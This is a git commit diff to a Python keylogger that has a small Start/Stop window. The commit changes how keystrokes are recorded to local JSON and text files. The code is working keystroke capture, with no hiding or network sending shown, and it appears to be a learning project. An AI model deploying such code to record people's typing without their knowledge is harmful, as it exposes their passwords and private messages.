0b938de3501491c4b39637761c6d298954fe7028
Aalok Thakur <133952022+Kinachaiyoo@users.noreply.github.com>
2024-08-19 20:12:34 +0545

    keylog.py

--- keylog.py
+++ keylog.py
@@ -6,36 +6,37 @@ import json
 class Keylogger:
     def __init__(self):
         self.keys_used = []
-        self.flag = False
         self.keys = ""
         self.listener = None
 
-    def generate_text_log(self, key):
+    def generate_text_log(self):
         with open('key_log.txt', "a") as keys_file:
-            keys_file.write(key)
+            keys_file.write(self.keys + "\n")
+        self.keys = ""
 
     def generate_json_file(self):
         with open('key_log.json', 'w') as key_log:
             json.dump(self.keys_used, key_log)
 
     def on_press(self, key):
-        if not self.flag:
+        try:
             self.keys_used.append({'Pressed': f'{key}'})
-            self.flag = True
-
-        if self.flag:
-            self.keys_used.append({'Held': f'{key}'})
-        self.generate_json_file()
+            self.generate_json_file()
+            if str(key) == 'Key.space':
+                self.keys += ' '
+            elif str(key) == 'Key.enter':
+                self.generate_text_log()
+            else:
+                self.keys += str(key).replace('Key.', '')
+        except AttributeError:
+            print(f"Unknown key: {key}")
 
     def on_release(self, key):
-        self.keys_used.append({'Released': f'{key}'})
-
-        if self.flag:
-            self.flag = False
-        self.generate_json_file()
-
-        self.keys += str(key)
-        self.generate_text_log(str(self.keys))
+        try:
+            self.keys_used.append({'Released': f'{key}'})
+            self.generate_json_file()
+        except AttributeError:
+            print(f"Unknown key: {key}")
 
     def start_keylogger(self):
         self.listener = keyboard.Listener(on_press=self.on_press, on_release=self.on_release)
@@ -66,6 +67,6 @@ start_button.pack(side=LEFT)
 stop_button = Button(root, text="Stop", command=keylogger.stop_keylogger, state='disabled')
 stop_button.pack(side=RIGHT)
 
-root.geometry("250x100") 
+root.geometry("250x100")
 
 root.mainloop()
